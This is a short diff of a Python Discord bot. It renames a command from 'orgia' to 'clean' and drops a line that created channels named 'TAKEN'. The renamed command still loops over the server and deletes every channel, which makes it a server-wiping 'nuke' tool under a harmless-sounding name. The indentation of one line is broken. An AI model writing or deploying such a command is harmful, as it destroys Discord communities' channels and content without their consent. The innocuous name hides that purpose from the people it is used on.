@@ -24,11 +24,11 @@ async def on_ready():
   print("Aigis:",client.user.name,"819929289759653928:",client.user.id,"3:",discord.__version__)
 
 @client.command()
-async def orgia(ctx):
+async def clean(ctx):
 guild = ctx.guild
   for channel in guild.channels:
       await channel.delete()
-      await guild.create_text_channel('TAKEN')
+     
       
                 
 client.run(os.environ['token'])
